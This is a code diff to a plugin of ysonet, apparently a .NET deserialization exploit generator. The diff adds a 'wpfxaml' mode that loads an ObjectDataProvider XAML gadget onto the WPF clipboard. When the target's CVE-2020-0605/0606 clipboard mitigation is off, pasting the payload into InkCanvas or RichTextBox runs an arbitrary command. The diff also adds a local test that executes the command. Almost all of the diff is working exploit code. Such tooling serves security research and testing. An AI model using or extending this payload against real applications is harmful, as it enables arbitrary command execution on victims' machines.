@@ -11,11 +11,21 @@ using ysonet.Helpers;
  * 
  * Comments: 
  *  This was released as a PoC for NCC Group's research on `Use of Deserialisation in .NET Framework Methods` (December 2018)
- *  See `DataObject.SetData Method`: https://docs.microsoft.com/en-us/dotnet/api/system.windows.forms.dataobject.setdata 
+ *  See `DataObject.SetData Method`: https://docs.microsoft.com/en-us/dotnet/api/system.windows.forms.dataobject.setdata
  *  Security note was added after being reported: https://github.com/dotnet/dotnet-api-docs/pull/502
  *  It was possible to copy other objects into the clipboard but this plugin only utilises one method that is used in the DataSetBinaryMarshal class
  *  The object will be copied to the clipboard and can be pasted into other affected applications such as Windows PowerShell ISE
  *  This PoC produces an error and may crash the application
+ *
+ *  Delivery modes (see --mode):
+ *   - winforms (default): the original behavior. A DataObject holds a BinaryFormatter
+ *     TextFormattingRunProperties gadget under a WinForms format.
+ *   - wpfxaml: an ObjectDataProvider XAML string placed under the WPF 'Xaml'
+ *     (DataFormats.Xaml) format, targeting WPF InkCanvas/RichTextBox paste. This is
+ *     restrictive by default since the CVE-2020-0605/0606 clipboard mitigation: it
+ *     only fires when the target enables the legacy clipboard switch or predates the
+ *     mitigation. It is a delivery vector for the ObjectDataProvider gadget, not a
+ *     default-config issue.
  **/
 
 namespace ysonet.Plugins
@@ -27,12 +37,16 @@ namespace ysonet.Plugins
         static bool test = false;
         static bool minify = false;
         static bool useSimpleType = true;
+        static string mode = "winforms";
+        static int xamlVariant = 2;
 
         static OptionSet options = new OptionSet()
             {
-                {"F|format=", "the object format: Csv, DeviceIndependentBitmap, DataInterchangeFormat, PenData, RiffAudio, WindowsForms10PersistentObject, System.String, SymbolicLink, TaggedImageFileFormat, WaveAudio. Default: WindowsForms10PersistentObject (the only one that works in Feb 2020 as a result of an incomplete silent patch - will not be useful to target text-based fields anymore)", v => format = v },
+                {"m|mode=", "delivery mode. 'winforms' (default): a BinaryFormatter gadget under a WinForms format (see --format). 'wpfxaml': an ObjectDataProvider XAML string under the WPF 'Xaml' clipboard format, targeting InkCanvas or RichTextBox paste. wpfxaml is blocked by default since the CVE-2020-0605/0606 clipboard fix; it only fires when the target turns on the legacy dangerous clipboard deserialization switch or predates that fix. Default: winforms", v => { if (v != null) mode = v.Trim().ToLowerInvariant(); } },
+                {"F|format=", "winforms mode only. The object format: Csv, DeviceIndependentBitmap, DataInterchangeFormat, PenData, RiffAudio, WindowsForms10PersistentObject, System.String, SymbolicLink, TaggedImageFileFormat, WaveAudio. Default: WindowsForms10PersistentObject (the only one that works in Feb 2020 as a result of an incomplete silent patch - will not be useful to target text-based fields anymore)", v => format = v },
+                {"xamlvariant=", "wpfxaml mode only. ObjectDataProvider XAML variant: 1 = bare ObjectDataProvider, 2 = ResourceDictionary wrapper (looks like real clipboard XAML). Default: 2", v => int.TryParse(v, out xamlVariant) },
                 {"c|command=", "the command to be executed", v => command = v },
-                {"t|test", "whether to run payload locally. Default: false", v => test =  v != null },
+                {"t|test", "whether to run payload locally. In wpfxaml mode this simulates the WPF paste path (restrictive vs legacy) and runs the command if it fires. Default: false", v => test =  v != null },
                 {"minify", "Whether to minify the payloads where applicable (experimental). Default: false", v => minify =  v != null },
                 {"ust|usesimpletype", "This is to remove additional info only when minifying and FormatterAssemblyStyle=Simple. Default: true", v => useSimpleType =  v != null },
             };
@@ -83,7 +97,14 @@ namespace ysonet.Plugins
                     System.Environment.Exit(-1);
                 }
 
-                object payload = "";
+                if (mode != "winforms" && mode != "wpfxaml")
+                {
+                    Console.Write("ysonet: ");
+                    Console.WriteLine("Unknown mode '" + mode + "'. Use 'winforms' or 'wpfxaml'.");
+                    Console.WriteLine("Try 'ysonet -p " + Name() + " --help' for more information.");
+                    System.Environment.Exit(-1);
+                }
+
                 if (String.IsNullOrEmpty(command) || String.IsNullOrWhiteSpace(command))
                 {
                     Console.Write("ysonet: ");
@@ -92,29 +113,73 @@ namespace ysonet.Plugins
                     System.Environment.Exit(-1);
                 }
 
-                // Creates a new data object.
-                System.Windows.Forms.DataObject myDataObject = new System.Windows.Forms.DataObject();
-
-                myDataObject.SetData(format, false, new AxHostStateMarshal(TextFormattingRunPropertiesGenerator.TextFormattingRunPropertiesGadget(inputArgs))); // for System.Windows.Forms
-
-                /*
-                myDataObject.SetData(format, new DataSetBinaryMarshal(TextFormattingRunPropertiesGenerator.TextFormattingRunPropertiesGadget(inputArgs)), false); // for System.Windows
-                */
-
-                Clipboard.Clear();
-                Clipboard.SetDataObject(myDataObject, true);
-
-                if (test)
+                if (mode == "wpfxaml")
                 {
-                    // PoC on how it works in practice
-                    try
+                    if (xamlVariant != 1 && xamlVariant != 2)
                     {
-                        IDataObject dataObj = Clipboard.GetDataObject();
-                        Object test = dataObj.GetData(format);
+                        Console.Write("ysonet: ");
+                        Console.WriteLine("Invalid xamlvariant '" + xamlVariant + "'. Use 1 or 2.");
+                        Console.WriteLine("Try 'ysonet -p " + Name() + " --help' for more information.");
+                        System.Environment.Exit(-1);
                     }
-                    catch (Exception err)
+
+                    // Build the ObjectDataProvider XAML with ysonet's existing generator,
+                    // then place it as a plain string under the WPF 'Xaml'
+                    // (DataFormats.Xaml == "Xaml") format. The WPF paste path reads it via
+                    // GetData(DataFormats.Xaml) as a string and hands it to XamlReader.Load,
+                    // which runs the gadget when the paste path is non-restrictive.
+                    ObjectDataProviderGenerator odpGen = new ObjectDataProviderGenerator();
+                    odpGen.Options().Parse(new string[] { "--variant", xamlVariant.ToString() });
+
+                    // Generate without the generator's own local test; when --test is set we
+                    // run our own faithful paste-path simulation below instead.
+                    bool runTest = inputArgs.Test;
+                    inputArgs.Test = false;
+                    string xamlPayload = (string)odpGen.Generate("xaml", inputArgs);
+                    inputArgs.Test = runTest;
+
+                    // Use the WPF clipboard (System.Windows), not the WinForms one. A
+                    // WinForms DataObject.SetData("Xaml", string) serializes the string with
+                    // BinaryFormatter into the clipboard, but WPF paste reads the 'Xaml'
+                    // format as raw UTF-16 text, so it would get garbage. WPF's own
+                    // DataObject stores the string the way WPF paste reads it back.
+                    System.Windows.DataObject wpfDataObject = new System.Windows.DataObject();
+                    wpfDataObject.SetData(System.Windows.DataFormats.Xaml, xamlPayload);
+
+                    System.Windows.Clipboard.Clear();
+                    System.Windows.Clipboard.SetDataObject(wpfDataObject, true);
+
+                    if (runTest)
                     {
-                        Debugging.ShowErrors(inputArgs, err);
+                        RunWpfXamlPasteTest(xamlPayload, inputArgs);
+                    }
+                }
+                else
+                {
+                    // Creates a new data object.
+                    System.Windows.Forms.DataObject myDataObject = new System.Windows.Forms.DataObject();
+
+                    myDataObject.SetData(format, false, new AxHostStateMarshal(TextFormattingRunPropertiesGenerator.TextFormattingRunPropertiesGadget(inputArgs))); // for System.Windows.Forms
+
+                    /*
+                    myDataObject.SetData(format, new DataSetBinaryMarshal(TextFormattingRunPropertiesGenerator.TextFormattingRunPropertiesGadget(inputArgs)), false); // for System.Windows
+                    */
+
+                    Clipboard.Clear();
+                    Clipboard.SetDataObject(myDataObject, true);
+
+                    if (test)
+                    {
+                        // PoC on how it works in practice
+                        try
+                        {
+                            IDataObject dataObj = Clipboard.GetDataObject();
+                            Object testObj = dataObj.GetData(format);
+                        }
+                        catch (Exception err)
+                        {
+                            Debugging.ShowErrors(inputArgs, err);
+                        }
                     }
                 }
             });
@@ -123,6 +188,45 @@ namespace ysonet.Plugins
             staThread.Join();
 
             return "Object copied to the clipboard";
+        }
+
+        // Faithful local simulation of the WPF paste path for the wpfxaml mode.
+        // WARNING: this runs the command locally if the gadget fires. It loads the
+        // same XAML two ways to mirror the paste gate:
+        //  1) restrictive (RestrictiveXamlXmlReader) - the default paste behavior
+        //     since the CVE-2020-0605/0606 mitigation -> the gadget is blocked.
+        //  2) non-restrictive - what the paste path uses when the target enables the
+        //     legacy clipboard switch or predates the mitigation -> the gadget runs.
+        // All diagnostic output goes to stderr so stdout/piping stays clean.
+        private static void RunWpfXamlPasteTest(string xamlPayload, InputArgs inputArgs)
+        {
+            Console.Error.WriteLine("[wpfxaml test] Simulating the WPF paste path locally. This runs your command if it fires.");
+
+            Console.Error.WriteLine("[wpfxaml test] 1) restrictive load (default paste since the CVE-2020-0605/0606 mitigation):");
+            try
+            {
+                SerializersHelper.Xaml_deserialize_restrictive(xamlPayload);
+                Console.Error.WriteLine("[wpfxaml test]    blocked: RestrictiveXamlXmlReader dropped ObjectDataProvider, so the gadget did not run. This is the safe default paste.");
+            }
+            catch (NotSupportedException nse)
+            {
+                Console.Error.WriteLine("[wpfxaml test]    " + nse.Message);
+            }
+            catch (Exception ex)
+            {
+                Console.Error.WriteLine("[wpfxaml test]    blocked with an exception (gadget did not run): " + ex.GetType().Name + ": " + ex.Message);
+            }
+
+            Console.Error.WriteLine("[wpfxaml test] 2) non-restrictive load (legacy switch on, or pre-mitigation framework):");
+            try
+            {
+                SerializersHelper.Xaml_deserialize(xamlPayload);
+                Console.Error.WriteLine("[wpfxaml test]    gadget executed (command ran locally).");
+            }
+            catch (Exception err)
+            {
+                Debugging.ShowErrors(inputArgs, err);
+            }
         }
     }
 }
